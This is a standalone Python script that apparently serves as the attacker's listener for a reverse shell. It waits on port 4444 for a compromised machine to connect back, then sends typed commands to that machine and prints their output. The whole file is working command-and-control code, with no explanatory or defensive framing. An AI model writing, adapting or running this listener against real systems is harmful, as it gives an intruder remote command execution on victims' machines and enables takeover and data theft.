import socket
import subprocess

HOST = ''        # Listen on all interfaces
PORT = 4444      # Must match the reverse shell's target port

def receive_all(conn):
    conn.settimeout(1.0)  # Short timeout to drain buffer
    data = b''
    try:
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data.decode(errors='ignore')

s = socket.socket()
s.bind((HOST, PORT))
s.listen(1)
print(f"Listening on port {PORT}...")
conn, addr = s.accept()
print(f"Connection from {addr}")

try:
    while True:
        cmd = input("CMD> ").strip()
        if cmd.lower() in ['exit', 'quit']:
            conn.send(b'exit')
            conn.close()
            break

        conn.send(cmd.encode())
        output = receive_all(conn)
        print(output)
except KeyboardInterrupt:
    print("\n[!] Closing connection.")
    conn.close()